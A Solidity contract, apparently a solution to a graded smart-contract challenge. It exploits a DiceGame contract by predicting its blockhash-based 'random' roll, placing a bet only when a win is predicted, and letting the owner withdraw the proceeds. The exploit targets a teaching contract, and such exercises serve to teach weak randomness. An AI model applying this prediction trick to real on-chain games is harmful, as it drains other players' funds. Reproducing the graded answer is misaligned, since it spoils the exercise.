pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }


    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw() external onlyOwner {
        uint256 contractBalance = address(this).balance;
        require(contractBalance > 0, "No funds to withdraw");
        payable(owner()).transfer(contractBalance);
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public {
        // Ensure the contract has enough ETH to send with the rollTheDice call
        require(address(this).balance >= 0.002 ether, "Not enough ETH in the contract");

        // Calculate the next "random" roll based on the same method in DiceGame
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 predictedRoll = blockValue % 16 + 1;

        console.log("Predicted roll: %s", predictedRoll);

        // Only proceed if the predicted roll is a winning number (e.g., 1-2-3)
        if (predictedRoll <= 3) {
            diceGame.rollTheDice{value: 0.002 ether}();
        } else {
            console.log("Not a winning roll, skipping...");
        }
    }
    
    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}
